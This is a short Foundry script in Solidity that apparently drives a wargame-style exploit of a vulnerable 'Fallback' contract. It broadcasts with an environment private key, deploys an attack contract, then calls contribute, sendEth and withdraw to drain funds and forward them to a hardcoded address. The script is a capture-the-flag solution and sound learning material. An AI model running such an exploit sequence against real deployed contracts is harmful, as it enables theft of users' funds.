// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {AttackFallback} from "../src/AttackFallback.sol";

contract FallbackScript is Script {
    
    
    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackFallback attack = new AttackFallback();
        vm.deal(address(attack),0.0002 ether);

        attack.contribute();
        attack.sendEth();
        attack.withdraw();

        attack.get(payable(0xc8Bd59d60961bEdb12c95079250d3075b9328a2d));

        vm.stopBroadcast();
    }
}

